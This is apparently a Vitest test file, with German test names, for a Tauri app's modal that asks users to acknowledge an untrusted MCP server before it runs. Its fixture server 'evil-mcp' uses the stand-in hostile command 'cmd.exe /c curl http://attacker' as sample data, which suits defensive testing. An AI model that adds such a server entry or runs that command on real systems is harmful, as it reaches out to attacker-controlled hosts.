import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const invokeMock = vi.fn<(cmd: string, args?: unknown) => Promise<unknown>>();

vi.mock('@tauri-apps/api/core', () => ({
  invoke: (cmd: string, args?: unknown) => invokeMock(cmd, args),
}));

vi.mock('@tauri-apps/api/event', () => ({
  listen: async () => () => {},
}));

vi.mock('../src/lib/sidecar-status', () => ({
  useSidecarOk: () => true,
  useSidecarStatus: () => ({ ok: true, failure: null }),
}));

beforeEach(() => {
  invokeMock.mockReset();
});

const ENTRY = {
  name: 'evil-mcp',
  host: 'claude-code-project' as const,
  sourcePath: '/path/to/.claude/mcp.json',
  command: 'cmd.exe',
  args: ['/c', 'curl', 'http://attacker'],
};

describe('McpTrustModal', () => {
  it('rendert serverKey, command und args sichtbar', async () => {
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="claude-code-project:evil-mcp"
        entry={ENTRY}
        message="MCP-Server nicht in der trust-list — User-Acknowledge erforderlich"
        onClose={() => {}}
        onAcknowledged={() => {}}
      />,
    );

    expect(screen.getByTestId('mcp-trust-server-key').textContent).toBe(
      'claude-code-project:evil-mcp',
    );
    const details = screen.getByTestId('mcp-trust-details');
    expect(details.textContent).toContain('evil-mcp');
    expect(details.textContent).toContain('claude-code-project');
    expect(details.textContent).toContain('cmd.exe');
    expect(details.textContent).toContain('/c curl http://attacker');
  });

  it('zeigt "(keine)" wenn args leer ist', async () => {
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="claude-desktop:noop-mcp"
        entry={{ ...ENTRY, args: [] }}
        message=""
        onClose={() => {}}
        onAcknowledged={() => {}}
      />,
    );
    expect(screen.getByTestId('mcp-trust-details').textContent).toContain('(keine)');
  });

  it('Vertrauen-Button ruft mcp.trust.acknowledge + reprobe', async () => {
    const calls: { method: string; params: unknown }[] = [];
    invokeMock.mockImplementation(async (cmd, args) => {
      if (cmd !== 'rpc_call') return null;
      const { method, params } = args as { method: string; params: unknown };
      calls.push({ method, params });
      if (method === 'mcp.trust.acknowledge') {
        return {
          ok: true,
          serverKey: 'claude-code-project:evil-mcp',
          acknowledgedAt: '2026-05-23T11:00:00Z',
        };
      }
      if (method === 'mcp.clients.reprobe') {
        return {
          ok: true,
          key: 'claude-code-project:evil-mcp',
          entry: ENTRY,
          result: { kind: 'spawn-failed', durationMs: 5, message: 'still nope' },
          probedAt: '2026-05-23T11:00:05Z',
        };
      }
      throw new Error(`unmocked: ${method}`);
    });

    const onAcknowledged = vi.fn();
    const onClose = vi.fn();
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="claude-code-project:evil-mcp"
        entry={ENTRY}
        message="needs trust"
        onClose={onClose}
        onAcknowledged={onAcknowledged}
      />,
    );

    fireEvent.click(screen.getByTestId('mcp-trust-acknowledge'));

    await waitFor(() => {
      expect(onAcknowledged).toHaveBeenCalledTimes(1);
      expect(onClose).toHaveBeenCalledTimes(1);
    });
    const methods = calls.map((c) => c.method);
    expect(methods).toContain('mcp.trust.acknowledge');
    expect(methods).toContain('mcp.clients.reprobe');
    const ack = calls.find((c) => c.method === 'mcp.trust.acknowledge');
    expect((ack?.params as { serverKey: string }).serverKey).toBe('claude-code-project:evil-mcp');
  });

  it('Abbrechen-Button schliesst Modal ohne acknowledge zu rufen', async () => {
    const onClose = vi.fn();
    const onAcknowledged = vi.fn();
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="x:y"
        entry={ENTRY}
        message=""
        onClose={onClose}
        onAcknowledged={onAcknowledged}
      />,
    );

    fireEvent.click(screen.getByText('Abbrechen (nicht jetzt)'));
    expect(onClose).toHaveBeenCalledTimes(1);
    expect(onAcknowledged).not.toHaveBeenCalled();
    expect(invokeMock).not.toHaveBeenCalled();
  });

  it('zeigt error-banner wenn acknowledge throwt', async () => {
    invokeMock.mockImplementation(async () => {
      throw new Error('sidecar not available');
    });
    const onClose = vi.fn();
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="x:y"
        entry={ENTRY}
        message=""
        onClose={onClose}
        onAcknowledged={() => {}}
      />,
    );

    fireEvent.click(screen.getByTestId('mcp-trust-acknowledge'));

    expect(await screen.findByText(/sidecar not available/)).toBeInTheDocument();
    // Modal bleibt offen damit User die Fehlermeldung sieht
    expect(onClose).not.toHaveBeenCalled();
  });

  it('reprobe-Fehler bricht den Acknowledge-Erfolg NICHT (best-effort)', async () => {
    invokeMock.mockImplementation(async (cmd, args) => {
      if (cmd !== 'rpc_call') return null;
      const { method } = args as { method: string };
      if (method === 'mcp.trust.acknowledge') {
        return { ok: true, serverKey: 'x:y', acknowledgedAt: '2026-05-23T11:00:00Z' };
      }
      if (method === 'mcp.clients.reprobe') {
        throw new Error('temporary reprobe glitch');
      }
      throw new Error(`unmocked: ${method}`);
    });

    const onAcknowledged = vi.fn();
    const onClose = vi.fn();
    const { McpTrustModal } = await import('../src/components/mcp-trust-modal');
    render(
      <McpTrustModal
        serverKey="x:y"
        entry={ENTRY}
        message=""
        onClose={onClose}
        onAcknowledged={onAcknowledged}
      />,
    );

    fireEvent.click(screen.getByTestId('mcp-trust-acknowledge'));

    await waitFor(() => {
      expect(onAcknowledged).toHaveBeenCalledTimes(1);
      expect(onClose).toHaveBeenCalledTimes(1);
    });
  });
});
